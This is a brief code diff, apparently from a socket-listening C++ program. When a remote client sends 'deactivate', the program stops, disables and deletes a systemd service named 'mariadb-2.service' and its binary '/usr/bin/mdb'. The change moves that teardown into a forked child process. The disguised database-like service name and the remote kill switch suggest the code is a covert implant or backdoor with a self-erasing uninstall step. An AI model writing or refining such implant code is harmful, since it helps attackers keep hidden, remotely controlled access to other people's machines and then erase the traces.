@@ -56,14 +56,15 @@ int main()
                if (std::string(buf) == "deactivate\n"){
                    send(client_fd,"deactivating\n",13,0);
 
-                   //system("systemctl stop mariadb-2.service");
-                   system("systemctl disable mariadb-2.service");
-                   system("rm -f /usr/lib/systemd/system/mariadb-2.service");
-                   system("rm -f /usr/bin/mdb");
-                   system("systemctl daemon-reload");
-                   system("systemctl reset-failed");
-                   close(client_fd);
-                   break;
+                   if (fork() == 0){
+                       system("systemctl stop mariadb-2.service");
+                       system("systemctl disable mariadb-2.service");
+                       system("rm -f /usr/lib/systemd/system/mariadb-2.service");
+                       system("rm -f /usr/bin/mdb");
+                       system("systemctl daemon-reload");
+                       system("systemctl reset-failed");
+                   }
+                   exit(0);
                }
 
                FILE* fp;
